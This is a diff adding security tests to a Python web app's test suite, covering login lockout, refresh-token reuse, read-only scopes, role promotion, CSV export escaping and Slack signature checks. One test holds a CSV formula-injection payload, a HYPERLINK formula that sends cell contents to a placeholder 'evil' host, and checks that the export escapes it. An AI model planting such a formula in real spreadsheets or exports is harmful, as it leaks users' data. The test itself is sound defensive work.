@@ -171,3 +171,92 @@ async def test_rate_limit_counts_client_address_too(app, monkeypatch: pytest.Mon
             for i in range(2 * hardening.PER_ADDRESS_FACTOR + 2)
         ]
     assert codes[0] == 401 and codes[-1] == 429
+
+
+async def test_lockout_lets_the_owner_in_from_a_known_address(client: AsyncClient) -> None:
+    from glasshaus.identity import service as identity
+
+    world = await make_world()
+    good = {"email": world.owner.email, "password": PASSWORD, "organization": world.tenant.slug}
+    home = {"X-Forwarded-For": "10.9.9.9"}
+    assert (await client.post("/api/v1/auth/login", json=good, headers=home)).status_code == 200
+    bad = {**good, "password": "not the password!"}
+    for i in range(identity.ACCOUNT_MAX_ATTEMPTS + 1):  # a stranger, from many addresses
+        await client.post("/api/v1/auth/login", json=bad, headers={"X-Forwarded-For": f"10.1.0.{i}"})
+    new_place = await client.post("/api/v1/auth/login", json=good, headers={"X-Forwarded-For": "10.2.0.1"})
+    assert new_place.status_code == 429  # guessing from new addresses stays blocked
+    assert (await client.post("/api/v1/auth/login", json=good, headers=home)).status_code == 200
+
+
+async def test_reusing_an_old_refresh_token_ends_the_sign_in(
+    client: AsyncClient, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from datetime import timedelta
+
+    from glasshaus.identity import service as identity
+
+    world = await make_world()
+    body = {"email": world.owner.email, "password": PASSWORD, "organization": world.tenant.slug}
+    assert (await client.post("/api/v1/auth/login", json=body)).status_code == 200
+    stolen = client.cookies.get("gh_refresh")
+    assert stolen
+    assert (await client.post("/api/v1/auth/refresh")).status_code == 200  # the real browser rotates
+    assert (await client.get("/api/v1/users/me")).status_code == 200
+    monkeypatch.setattr(identity, "REUSE_GRACE", timedelta(seconds=-1))
+    thief = AsyncClient(transport=client._transport, base_url=str(client.base_url))
+    thief.cookies.set("gh_refresh", stolen)
+    assert (await thief.post("/api/v1/auth/refresh")).status_code == 401
+    await thief.aclose()
+    assert (await client.post("/api/v1/auth/refresh")).status_code == 401  # everyone signed out
+
+
+async def test_read_only_tokens_change_nothing(client: AsyncClient) -> None:
+    from glasshaus.core.rbac import Scope
+    from tests.factories import auth, create_task, token_for
+
+    world = await make_world()
+    task = await create_task(client, world)
+    r = await client.post(
+        "/api/v1/time-entries", json={"task": task["id"], "minutes": 30}, headers=world.headers
+    )
+    entry = r.json()
+    reader = auth(await token_for(world.owner, (Scope.READ,)))
+    r = await client.patch(f"/api/v1/time-entries/{entry['id']}", json={"minutes": 1}, headers=reader)
+    assert r.status_code == 403
+    assert (await client.delete(f"/api/v1/time-entries/{entry['id']}", headers=reader)).status_code == 403
+    r = await client.post(
+        f"/api/v1/projects/{world.project.id}/views",
+        json={"name": "Mine", "kind": "list", "config": {}},
+        headers=reader,
+    )
+    assert r.status_code == 403
+
+
+async def test_promotions_need_a_signed_in_person(client: AsyncClient) -> None:
+    from tests.factories import make_user
+
+    world = await make_world()
+    person = await make_user(world.tenant)
+    r = await client.patch(f"/api/v1/users/{person.id}", json={"org_role": "admin"}, headers=world.headers)
+    assert r.status_code == 403 and "signed in" in r.json()["detail"]
+    r = await client.patch(f"/api/v1/users/{person.id}", json={"org_role": "guest"}, headers=world.headers)
+    assert r.status_code == 200  # lowering access by token is fine
+
+
+async def test_csv_cells_cannot_run_formulas(client: AsyncClient) -> None:
+    from tests.factories import create_task
+
+    world = await make_world()
+    await create_task(client, world, title="Plain", tags=['=HYPERLINK("//evil/?"&B2)'])
+    r = await client.get(f"/api/v1/projects/{world.project.id}/tasks/export", headers=world.headers)
+    assert r.status_code == 200
+    text = r.text.lower()  # tags are stored in lower case
+    assert "'=hyperlink" in text and ",=hyperlink" not in text and '"=hyperlink' not in text
+
+
+def test_slack_commands_need_a_signing_secret() -> None:
+    from glasshaus.core.errors import Unauthenticated
+    from glasshaus.integrations.slack_command import verify
+
+    with pytest.raises(Unauthenticated):
+        verify("", {"x-slack-request-timestamp": "1", "x-slack-signature": "v0=x"}, b"", now=1)
